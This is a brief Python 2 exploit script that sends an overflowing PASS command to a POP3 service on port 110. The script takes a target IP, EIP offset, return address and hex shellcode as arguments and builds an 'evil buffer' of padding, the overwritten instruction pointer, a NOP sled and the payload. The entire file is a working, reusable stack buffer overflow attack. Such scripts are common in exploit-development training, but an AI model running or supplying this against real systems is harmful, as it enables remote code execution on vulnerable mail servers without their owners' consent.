
#!/usr/bin/python
import socket
import sys

if len(sys.argv) != 5:
    print "\n[*] Usage: " + sys.argv[0] + " <ip_address> <EIP_offset> <EIP_address> <payload>\n"
    sys.exit(0)

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)

buffer='A' * int(sys.argv[2]) + sys.argv[3].decode('hex') + "\x90" * 16 + sys.argv[4].decode('hex')

try:
    print "\nSending evil buffer..."
    s.connect((sys.argv[1], 110))
    data=s.recv(1024)
    s.send('USER username\r\n')
    data=s.recv(1024)
    s.send('PASS ' + buffer + '\r\n')
    print "\nDone!"
except:
    print "Could not connect to POP3 on " + sys.argv[1]
